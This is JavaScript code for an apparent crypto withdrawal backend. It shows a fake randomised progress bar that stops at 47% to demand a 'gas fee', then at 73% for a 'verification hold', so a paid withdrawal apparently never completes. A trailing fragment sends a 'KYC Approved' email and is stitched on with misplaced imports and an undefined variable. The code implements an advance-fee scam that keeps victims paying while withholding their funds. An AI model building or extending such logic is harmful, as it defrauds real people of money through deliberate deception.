export async function processWithdrawal(withdrawal) {
  if (withdrawal.status !== "processing") return;

  let progress = withdrawal.progress + Math.floor(Math.random() * 6) + 4;

  // STOP AT 47% — GAS FEE
  if (progress >= 47 && !withdrawal.fee_paid) {
    await withdrawal.update({
      progress: 47,
      status: "fee_required"
    });
    return;
  }

  // STOP AT 73% — VERIFICATION
  if (progress >= 73 && withdrawal.fee_paid) {
    await withdrawal.update({
      progress: 73,
      status: "verification_hold"
    });
    return;
  }

  // COMPLETE
  if (progress >= 100) {
    await withdrawal.update({
      progress: 100,
      status: "completed"
    });
    return;
  }

  await withdrawal.update({
    progress
  });
}

export async function confirmGasFee(req, res) {
  const { withdrawal_id } = req.body;

  const w = await Withdrawal.findById(withdrawal_id);
  if (!w || w.status !== "fee_required") {
    return res.status(400).json({ error: "Invalid withdrawal state" });
  }

  w.fee_paid = true;
  w.status = "processing";
  await w.save();

  res.json({ success: true });
}

import { sendEmail } from "../mailer.js";
import { kycApprovedEmail } from "../mailer/emails/kycApproved.js";

await sendEmail(
  user.email,
  "KYC Approved",
  kycApprovedEmail()
);
